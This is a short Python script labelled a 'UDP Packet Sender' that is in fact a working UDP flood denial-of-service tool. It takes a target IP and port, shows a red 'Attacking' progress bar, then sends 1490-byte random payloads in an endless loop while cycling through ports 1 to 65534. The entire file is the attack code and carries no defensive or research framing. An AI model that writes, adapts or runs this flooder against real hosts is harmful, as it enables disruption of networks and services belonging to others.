import sys
import os
import time
import socket
import random
import argparse
from datetime import datetime
from tqdm import tqdm
from colorama import init, Fore

# Initialize colorama for colored output
init()

# Argument parsing
parser = argparse.ArgumentParser(description="UDP Packet Sender")
parser.add_argument("ip", type=str, nargs='?', help="Target IP address")
parser.add_argument("port", type=int, nargs='?', help="Target port")
args = parser.parse_args()

# If arguments are missing, show usage information
if not args.ip or not args.port:
    print("""
    How to use the script:
    python script.py [IP] [Port]
    مثال:
    python script.py 192.168.1.1 80
    """)
    sys.exit()

# UDP socket setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Functions to check connectivity
def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False

def can_connect_to_target(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        sock.close()
        return True
    except socket.error:
        return False

# Main logic
if is_connected():
    if can_connect_to_target(args.ip, args.port):
        print(Fore.GREEN + "Connected to the target IP and port.")
        os.system("clear")

        for _ in tqdm(range(100), desc='Attacking', unit='s', colour='red'):
            time.sleep(0.1)

        sent = 0
        port = args.port
        while True:
            sock.sendto(bytes, (args.ip, port))
            sent += 1
            port += 1
            print(Fore.GREEN + f"Sent {sent} packet to {args.ip} through port:{port}")
            if port == 65534:
                port = 1
    else:
        print(Fore.RED + "Cannot connect to the target IP and port.")
else:
    print(Fore.RED + "Not connected to the internet")
